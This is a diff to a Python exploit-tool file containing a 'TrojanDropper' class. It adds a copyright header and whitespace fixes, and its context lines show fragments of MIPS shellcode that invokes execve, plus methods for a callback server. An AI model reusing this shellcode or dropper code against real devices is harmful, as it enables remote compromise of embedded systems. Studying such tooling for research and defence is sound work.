@@ -1,3 +1,9 @@
+# Copyright (c) 2013
+# - Zachary Cutlip <uid000@gmail.com>
+# - Tactical Network Solutions, LLC
+# 
+# See LICENSE.txt for more details.
+# 
 import string
 import socket
 import os
@@ -63,7 +69,7 @@ class TrojanDropper:
         "\xd4\xff\xa2\xaf", # sw	v0,-44(sp)
         "\xff\xff\x06\x28", # slti	a2,zero,-1
         "\xab\x0f\x02\x24", # li	v0,4011
-        "\x0c\x01\x01\x01"  # syscall	0x40404    
+        "\x0c\x01\x01\x01"  # syscall	0x40404
 ],'')
 
     def __init__(self,exploit_callback):
@@ -86,7 +92,7 @@ class TrojanDropper:
 
     def stop_server(self):
         os.kill(self.callback_pid,signal.SIGTERM)
-    
+
     def wait_til_done(self):
         try:
             os.waitpid(self.callback_pid,0)
